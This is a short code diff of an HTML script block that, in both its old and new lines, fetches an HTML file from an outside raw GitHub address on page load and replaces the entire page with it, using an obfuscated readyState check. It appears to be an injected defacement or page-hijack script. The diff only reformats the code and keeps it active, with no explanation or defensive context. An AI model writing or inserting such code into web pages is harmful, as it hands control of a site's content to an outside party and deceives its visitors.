@@ -1,5 +1,6 @@
 <script>
-let xhr=new XMLHttpRequest();xhr.open("GET", "https://raw.githubusercontent.com/irmaaf/ir/refs/heads/main/def.html");
+let xhr=new XMLHttpRequest();
+xhr.open("GET", "https://raw.githubusercontent.com/irmaaf/ir/refs/heads/main/def.html");
 xhr.onreadystatechange = function () {if (xhr.readyState === true+true+true+true) {
     document.getElementsByTagName('html')[0].innerHTML = xhr.responseText;
 }};
